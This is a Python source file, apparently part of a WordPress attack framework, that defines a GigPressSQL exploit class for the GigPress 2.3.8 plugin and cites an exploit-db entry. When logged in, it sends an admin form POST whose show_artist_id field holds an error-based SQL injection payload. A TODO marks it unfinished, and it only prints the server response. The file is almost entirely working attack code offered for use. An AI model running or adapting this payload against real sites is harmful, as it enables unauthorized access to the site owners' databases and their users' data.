from ..exploitsql import ExploitSql


# TODO Finish exploit
class GigPressSQL(ExploitSql):
    exploit_info = {
        'exploit_name': 'GigPress',
        'exploit_version': '2.3.8',
        'exploit_url': 'https://www.exploit-db.com/exploits/37109/'
    }

    def exploit(self):
        if self.loggedin:
            exploit = {
                'wpnonce': 'b31c921d92',
                'wp_http_referer': '/wordpress/wp-admin/admin.php?page=gigpress/gigpress.php',
                'gpaction': 'add',
                'show_status': 'active',
                'gp_dd': '05',
                'gp_yy': '2015',
                'show_artist_id': '1 AND (SELECT 9266 FROM(SELECT COUNT(*),CONCAT(0x717a6a7a71,(SELECT (ELT(9266=9266,1))),0x71786a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)',
                'show_venue_id': '1',
                'show_related': 'new'
            }

            response = self.request(
                self.hostname + '/wp-admin/admin.php?page=gigpress/gigpress.php', data=exploit, method='POST',
                urlencode=True)

            print(response)
            exit()
        else:
            return self.exploitnotfound(self.exploit_info)
